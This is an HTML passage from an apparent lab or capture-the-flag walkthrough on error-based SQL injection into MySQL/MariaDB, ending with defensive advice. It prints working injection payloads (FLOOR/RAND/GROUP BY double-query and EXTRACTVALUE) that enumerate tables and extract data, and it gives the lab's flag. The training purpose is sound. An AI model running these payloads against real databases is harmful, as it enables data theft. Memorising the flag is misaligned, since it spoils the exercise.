<h4>Step 1: Detect the Injection Point</h4>
<p>
    Enter a single quote <code>'</code> in the Account Type field.
    You should see a MySQL syntax error confirming the injection point.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#039;&#039;&#039;&#039;&#039; at line 1
    </div>
</div>

<h4>Step 2: Understand the FLOOR/RAND/GROUP BY Technique</h4>
<p>
    This classic error-based technique exploits a quirk in MySQL's handling of
    <code>GROUP BY</code> with non-deterministic expressions. Here is how it works:
</p>
<ol>
    <li><code>FLOOR(RAND(0)*2)</code> generates a predictable sequence: 0, 1, 1, 0, 1, 1, ...</li>
    <li>We <code>CONCAT()</code> our target data with this value to create a grouping key.</li>
    <li><code>COUNT(*)</code> with <code>GROUP BY</code> tries to insert this key into a temporary table.</li>
    <li>Because <code>RAND()</code> is evaluated twice (once for checking, once for inserting),
        MySQL tries to insert a duplicate key, causing a <strong>&ldquo;Duplicate entry&rdquo;</strong> error.</li>
    <li>The error message contains our concatenated data!</li>
</ol>

<h4>Step 3: Discover the Vault Table</h4>
<p>
    First, enumerate tables to find where the secret is stored. Use the double-query
    technique to extract table names from <code>information_schema</code>:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Enumerate Tables</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -
    </div>
</div>

<p>
    The error will reveal <code>Duplicate entry 'vault:1' for key 'group_key'</code>,
    confirming the <code>vault</code> table exists.
</p>

<h4>Step 4: Extract the Vault Code</h4>
<p>
    Now extract the <code>vault_code</code> from the <code>vault</code> table:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Extract the Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT vault_code FROM vault LIMIT 1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -
    </div>
</div>

<p>
    The error message will show: <code>Duplicate entry 'FLAG{fl00r_r4nd_d0ubl3_qu3ry}:1' for key 'group_key'</code>.
    The flag is the part before <code>:1</code>.
</p>

<h4>Step 5: Alternative. EXTRACTVALUE</h4>
<p>
    The same data can be extracted using EXTRACTVALUE if you prefer:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. EXTRACTVALUE Alternative</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT vault_code FROM vault LIMIT 1))) -- -
    </div>
</div>

<p>
    This produces: <code>XPATH syntax error: '~FLAG{fl00r_r4nd_d0ubl3_qu3ry}'</code>.
</p>

<h4>Step 6: Submit the Vault Code</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{fl00r_r4nd_d0ubl3_qu3ry}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> The FLOOR/RAND/GROUP BY technique is one of the
    oldest and most reliable error-based SQL injection methods. It works across
    many MySQL and MariaDB versions. The &ldquo;Duplicate entry&rdquo; error message
    becomes a data exfiltration channel. Suppressing error messages and using
    prepared statements are both essential defenses.
</div>
